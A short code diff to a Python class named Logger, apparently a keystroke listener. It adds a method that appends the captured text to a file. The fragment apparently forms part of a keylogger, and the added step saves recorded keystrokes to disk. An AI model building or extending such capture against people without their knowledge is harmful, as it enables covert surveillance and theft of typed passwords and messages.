@@ -9,10 +9,21 @@ class Logger:
         self.stop_flag = False
         self.start_listener()
 
+
     def get_text_out(self):
         captured_text=self.text
         self.text=""
         return captured_text
+
+    def write_to_file(self,filename):
+        try:
+            with open(filename,'a') as file_obj:
+                file_obj.write(self.get_text_out())
+            res=True
+        except:
+            res=False
+        finally:
+            return res
 
     def on_press(self, key):
 
